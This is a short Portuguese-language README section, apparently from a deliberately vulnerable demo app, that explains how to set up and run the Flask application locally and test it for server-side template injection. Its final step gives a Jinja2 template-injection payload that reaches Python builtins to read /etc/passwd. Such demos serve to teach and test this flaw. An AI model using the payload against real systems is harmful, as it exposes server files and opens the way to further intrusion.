## Como executar o programa de teste?

Segue um exemplo de como realizar um teste desse tipo de vulnerabilidade:

Instalar o virtualenv:

    pip install virtualenv

Na pasta raíz do projeto, executar o seguinte comando:

    python3 -m virtualenv .venv

Ativar o virtualenv da aplicação:

    source .venv/bin/activate 

Em seguida instalar as dependências do projeto:

    pip install -r requirements.txt

Executar a aplicação:

    python app.py


Abrir a página no navegador:

    http://127.0.0.1:8010


Inserir o seguinte conteúdo no campo de texto de cada formulário e clicar nos dois botões enviar:

    {{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}
